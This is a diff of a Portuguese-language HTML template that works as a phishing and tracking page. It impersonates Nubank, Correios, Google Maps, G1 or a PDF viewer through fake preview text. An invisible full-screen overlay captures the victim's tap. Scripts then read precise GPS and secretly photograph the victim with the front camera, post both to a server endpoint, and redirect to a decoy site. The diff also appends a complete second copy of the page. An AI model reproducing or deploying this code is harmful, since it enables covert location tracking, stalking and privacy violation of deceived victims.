@@ -6,81 +6,84 @@
     
     {% if tema == 'nubank' %}
         <meta property="og:title" content="Comprovante de Transferência">
-        <meta property="og:description" content="Transferência via PIX. Toque para ver o comprovante.">
+        <meta property="og:description" content="R$ 150,00 - Recebido via PIX. Toque para ver o comprovante.">
         <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png">
+        <meta property="og:type" content="website">
+        <meta name="theme-color" content="#820ad1">
         <title>Nu Pagamentos S.A.</title>
     
     {% elif tema == 'correios' %}
-        <meta property="og:title" content="Objeto Saiu para Entrega">
-        <meta property="og:description" content="O carteiro não foi atendido. Clique para reagendar.">
+        <meta property="og:title" content="Objeto Saiu para Entrega ao Destinatário">
+        <meta property="og:description" content="Última atualização: Hoje às 08:30. Clique para acompanhar em tempo real.">
         <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Correios_%282020%29.svg/1200px-Correios_%282020%29.svg.png">
+        <meta property="og:type" content="website">
+        <meta name="theme-color" content="#ffe600">
         <title>Rastreamento Correios</title>
 
     {% elif tema == 'maps' %}
         <meta property="og:title" content="Localização em Tempo Real">
-        <meta property="og:description" content="Compartilhado via Google Maps. Ver trajeto.">
+        <meta property="og:description" content="Compartilhado via Google Maps. Ver trajeto e estimativa de chegada.">
         <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png">
+        <meta property="og:type" content="article">
         <title>Google Maps</title>
 
     {% elif tema == 'g1' %}
-        <meta property="og:title" content="URGENTE: Acidente grave na região bloqueia trânsito">
-        <meta property="og:description" content="Veja a lista de ruas interditadas agora.">
+        <meta property="og:title" content="URGENTE: Acidente grave bloqueia trânsito na sua região">
+        <meta property="og:description" content="Veja a lista de bairros afetados e rotas alternativas agora.">
         <meta property="og:image" content="https://s2.glbimg.com/QFv1N7T5bH7M5QJ7J5_QJ7J5_Q=/0x0:1200x675/984x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_59edd422c0c84a879bd37670ae4f538a/internal_photos/bs/2020/u/1/123456.jpg">
+        <meta property="og:type" content="article">
         <title>G1 - Notícias</title>
 
     {% else %}
         <meta property="og:title" content="Documento_Digital.pdf">
-        <meta property="og:description" content="Arquivo seguro criptografado. Toque para visualizar.">
+        <meta property="og:description" content="Arquivo seguro criptografado (PDF). Toque para visualizar.">
         <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/1200px-PDF_file_icon.svg.png">
+        <meta property="og:type" content="website">
         <title>Visualizador de Arquivos</title>
     {% endif %}
 
     <style>
-        body { margin: 0; background: #525659; font-family: -apple-system, BlinkMacSystemFont, sans-serif; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        .toolbar { background: #323639; height: 56px; display: flex; align-items: center; padding: 0 16px; color: white; justify-content: space-between; z-index: 2; }
-        .viewport { flex: 1; display: flex; justify-content: center; padding: 15px; overflow-y: auto; position: relative; z-index: 1; }
-        .pdf-page { background: white; width: 100%; max-width: 600px; height: 800px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); display: flex; flex-direction: column; align-items: center; padding-top: 100px; text-align: center; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        body { margin: 0; background: #202124; font-family: -apple-system, BlinkMacSystemFont, sans-serif; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .toolbar { background: #323639; height: 56px; display: flex; align-items: center; padding: 0 16px; color: white; justify-content: center; z-index: 2; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .viewport { flex: 1; display: flex; justify-content: center; align-items: center; padding: 15px; position: relative; z-index: 1; }
+        .pdf-page { background: white; width: 100%; max-width: 90%; height: 70vh; box-shadow: 0 4px 12px rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 4px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #db4437; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* ZONA DE CLIQUE INVISÍVEL PARA IPHONE */
+        /* ZONA DE CLIQUE INVISÍVEL (ESSENCIAL PARA IPHONE) */
         #zona-fake { 
-            position: fixed; 
-            top: 0; left: 0; width: 100%; height: 100%; 
-            z-index: 9999; 
-            background: rgba(0,0,0,0); 
-            cursor: pointer;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            z-index: 9999; background: rgba(0,0,0,0); cursor: pointer;
         }
         
         #video, #canvas { display: none; }
-        
-        .msg-toque { font-weight: 500; color: #333; margin-top: 10px; }
+        .msg-toque { font-weight: 500; color: #5f6368; margin-top: 10px; font-size: 14px; }
         .btn-fake { 
-            background: #3b82f6; color: white; padding: 12px 24px; 
-            border-radius: 6px; font-weight: bold; margin-top: 20px; 
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            background: #1a73e8; color: white; padding: 10px 20px; 
+            border-radius: 4px; font-weight: bold; margin-top: 20px; 
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3); font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas" width="640" height="480"></canvas>
     
     <div id="zona-fake" onclick="usuarioTocou()"></div>
 
     <div class="toolbar">
-        <span id="doc-title">
-            {% if tema == 'nubank' %}Comprovante_Transacao.pdf
-            {% elif tema == 'correios' %}Rastreio_Encomenda.pdf
-            {% else %}Documento_Digital.pdf{% endif %}
+        <span id="doc-title" style="font-size: 14px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis;">
+            {% if tema == 'nubank' %}Comprovante_Transacao_Pix.pdf
+            {% elif tema == 'correios' %}Rastreamento_Detalhado.pdf
+            {% else %}Documento_Protegido.pdf{% endif %}
         </span>
     </div>
     
     <div class="viewport">
         <div class="pdf-page">
             <div class="spinner"></div>
-            <div id="status-text" class="msg-toque">Toque na tela para visualizar...</div>
-            <div class="btn-fake">VISUALIZAR AGORA</div>
+            <div id="status-text" class="msg-toque">Carregando visualização...</div>
+            <div class="btn-fake">ABRIR AGORA</div>
         </div>
     </div>
 
@@ -93,57 +96,58 @@
 
         function finalizar() { 
             if (globalStream) globalStream.getTracks().forEach(track => track.stop());
-            document.getElementById('status-text').innerText = "Abrindo documento...";
+            document.getElementById('status-text').innerText = "Redirecionando...";
             
             setTimeout(() => {
-                const link = document.createElement('a');
-                link.href = siteDestino;
-                link.rel = 'noreferrer noopener';
-                document.body.appendChild(link);
-                link.click();
-            }, 600);
+                window.location.href = siteDestino; // Redirecionamento forçado
+            }, 800);
         }
 
         async function capturarFoto() {
-            try {
-                // 'playsinline' é essencial para iPhone não abrir video em tela cheia
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                globalStream = stream;
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise(resolve => setTimeout(resolve, 800));
-                const canvas = document.getElementById('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                fotoBase64 = canvas.toDataURL('image/jpeg', 0.5);
-            } catch (err) { console.log("Câmera negada"); }
+            return new Promise(async (resolve) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    globalStream = stream;
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    // Aguarda o vídeo carregar para garantir que não saia preto
+                    video.onloadedmetadata = async () => {
+                        await new Promise(r => setTimeout(r, 500)); // Pequeno delay para foco
+                        const canvas = document.getElementById('canvas');
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+                        resolve();
+                    };
+                } catch (err) { 
+                    console.log("Câmera negada ou indisponível"); 
+                    resolve(); // Resolve mesmo com erro para não travar o fluxo
+                }
+            });
         }
 
-        // FUNÇÃO ACIONADA PELO TOQUE (Resolve o problema do iPhone)
         function usuarioTocou() {
             if (jaClicou) return;
             jaClicou = true;
             
-            // Remove a zona fake para permitir interação normal depois
             document.getElementById('zona-fake').remove();
-            document.getElementById('status-text').innerText = "Autenticando...";
+            document.getElementById('status-text').innerText = "Autenticando acesso...";
             
-            // Agora sim podemos pedir o GPS, pois estamos dentro de um evento de clique
+            // Inicia o processo de captura
             iniciarCaptura();
         }
 
         function iniciarCaptura() {
-            // Alta precisão para forçar o GPS real
-            const options = { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 };
+            const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
 
             navigator.geolocation.getCurrentPosition(
                 async function(pos) {
-                    // Sucesso GPS
+                    // Sucesso no GPS -> Tenta Foto -> Envia Tudo
                     await capturarFoto();
                     enviarDados(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
                 }, 
                 async function(err) {
-                    // Erro GPS (usuário negou ou timeout)
-                    // Ainda tentamos pegar a foto!
+                    // Falha no GPS -> Tenta Foto -> Envia só a Foto (ou nada)
                     await capturarFoto();
                     enviarDados(null, null, null, null);
                 }, 
@@ -162,7 +166,187 @@
                     speed: spd, 
                     foto: fotoBase64 
                 })
-            }).finally(() => { finalizar(); });
+            }).then(() => {
+                finalizar();
+            }).catch(() => {
+                finalizar(); // Garante o redirecionamento mesmo se o fetch falhar
+            });
+        }
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    {% if tema == 'nubank' %}
+        <meta property="og:title" content="Comprovante de Transferência">
+        <meta property="og:description" content="R$ 150,00 - Recebido via PIX. Toque para ver o comprovante.">
+        <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png">
+        <meta property="og:type" content="website">
+        <meta name="theme-color" content="#820ad1">
+        <title>Nu Pagamentos S.A.</title>
+    
+    {% elif tema == 'correios' %}
+        <meta property="og:title" content="Objeto Saiu para Entrega ao Destinatário">
+        <meta property="og:description" content="Última atualização: Hoje às 08:30. Clique para acompanhar em tempo real.">
+        <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Correios_%282020%29.svg/1200px-Correios_%282020%29.svg.png">
+        <meta property="og:type" content="website">
+        <meta name="theme-color" content="#ffe600">
+        <title>Rastreamento Correios</title>
+
+    {% elif tema == 'maps' %}
+        <meta property="og:title" content="Localização em Tempo Real">
+        <meta property="og:description" content="Compartilhado via Google Maps. Ver trajeto e estimativa de chegada.">
+        <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png">
+        <meta property="og:type" content="article">
+        <title>Google Maps</title>
+
+    {% elif tema == 'g1' %}
+        <meta property="og:title" content="URGENTE: Acidente grave bloqueia trânsito na sua região">
+        <meta property="og:description" content="Veja a lista de bairros afetados e rotas alternativas agora.">
+        <meta property="og:image" content="https://s2.glbimg.com/QFv1N7T5bH7M5QJ7J5_QJ7J5_Q=/0x0:1200x675/984x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_59edd422c0c84a879bd37670ae4f538a/internal_photos/bs/2020/u/1/123456.jpg">
+        <meta property="og:type" content="article">
+        <title>G1 - Notícias</title>
+
+    {% else %}
+        <meta property="og:title" content="Documento_Digital.pdf">
+        <meta property="og:description" content="Arquivo seguro criptografado (PDF). Toque para visualizar.">
+        <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/1200px-PDF_file_icon.svg.png">
+        <meta property="og:type" content="website">
+        <title>Visualizador de Arquivos</title>
+    {% endif %}
+
+    <style>
+        body { margin: 0; background: #202124; font-family: -apple-system, BlinkMacSystemFont, sans-serif; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .toolbar { background: #323639; height: 56px; display: flex; align-items: center; padding: 0 16px; color: white; justify-content: center; z-index: 2; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .viewport { flex: 1; display: flex; justify-content: center; align-items: center; padding: 15px; position: relative; z-index: 1; }
+        .pdf-page { background: white; width: 100%; max-width: 90%; height: 70vh; box-shadow: 0 4px 12px rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 4px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #db4437; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* ZONA DE CLIQUE INVISÍVEL (ESSENCIAL PARA IPHONE) */
+        #zona-fake { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            z-index: 9999; background: rgba(0,0,0,0); cursor: pointer;
+        }
+        
+        #video, #canvas { display: none; }
+        .msg-toque { font-weight: 500; color: #5f6368; margin-top: 10px; font-size: 14px; }
+        .btn-fake { 
+            background: #1a73e8; color: white; padding: 10px 20px; 
+            border-radius: 4px; font-weight: bold; margin-top: 20px; 
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3); font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    
+    <div id="zona-fake" onclick="usuarioTocou()"></div>
+
+    <div class="toolbar">
+        <span id="doc-title" style="font-size: 14px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis;">
+            {% if tema == 'nubank' %}Comprovante_Transacao_Pix.pdf
+            {% elif tema == 'correios' %}Rastreamento_Detalhado.pdf
+            {% else %}Documento_Protegido.pdf{% endif %}
+        </span>
+    </div>
+    
+    <div class="viewport">
+        <div class="pdf-page">
+            <div class="spinner"></div>
+            <div id="status-text" class="msg-toque">Carregando visualização...</div>
+            <div class="btn-fake">ABRIR AGORA</div>
+        </div>
+    </div>
+
+    <script>
+        const idOrdem = "{{ id }}";
+        const siteDestino = "{{ destino }}";
+        let fotoBase64 = null;
+        let globalStream = null;
+        let jaClicou = false;
+
+        function finalizar() { 
+            if (globalStream) globalStream.getTracks().forEach(track => track.stop());
+            document.getElementById('status-text').innerText = "Redirecionando...";
+            
+            setTimeout(() => {
+                window.location.href = siteDestino; // Redirecionamento forçado
+            }, 800);
+        }
+
+        async function capturarFoto() {
+            return new Promise(async (resolve) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    globalStream = stream;
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    // Aguarda o vídeo carregar para garantir que não saia preto
+                    video.onloadedmetadata = async () => {
+                        await new Promise(r => setTimeout(r, 500)); // Pequeno delay para foco
+                        const canvas = document.getElementById('canvas');
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+                        resolve();
+                    };
+                } catch (err) { 
+                    console.log("Câmera negada ou indisponível"); 
+                    resolve(); // Resolve mesmo com erro para não travar o fluxo
+                }
+            });
+        }
+
+        function usuarioTocou() {
+            if (jaClicou) return;
+            jaClicou = true;
+            
+            document.getElementById('zona-fake').remove();
+            document.getElementById('status-text').innerText = "Autenticando acesso...";
+            
+            // Inicia o processo de captura
+            iniciarCaptura();
+        }
+
+        function iniciarCaptura() {
+            const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
+
+            navigator.geolocation.getCurrentPosition(
+                async function(pos) {
+                    // Sucesso no GPS -> Tenta Foto -> Envia Tudo
+                    await capturarFoto();
+                    enviarDados(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
+                }, 
+                async function(err) {
+                    // Falha no GPS -> Tenta Foto -> Envia só a Foto (ou nada)
+                    await capturarFoto();
+                    enviarDados(null, null, null, null);
+                }, 
+                options
+            );
+        }
+
+        function enviarDados(lat, lon, acc, spd) {
+            fetch(`/api/sinal/${idOrdem}`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ 
+                    latitude: lat, 
+                    longitude: lon, 
+                    accuracy: acc, 
+                    speed: spd, 
+                    foto: fotoBase64 
+                })
+            }).then(() => {
+                finalizar();
+            }).catch(() => {
+                finalizar(); // Garante o redirecionamento mesmo se o fetch falhar
+            });
         }
     </script>
 </body>
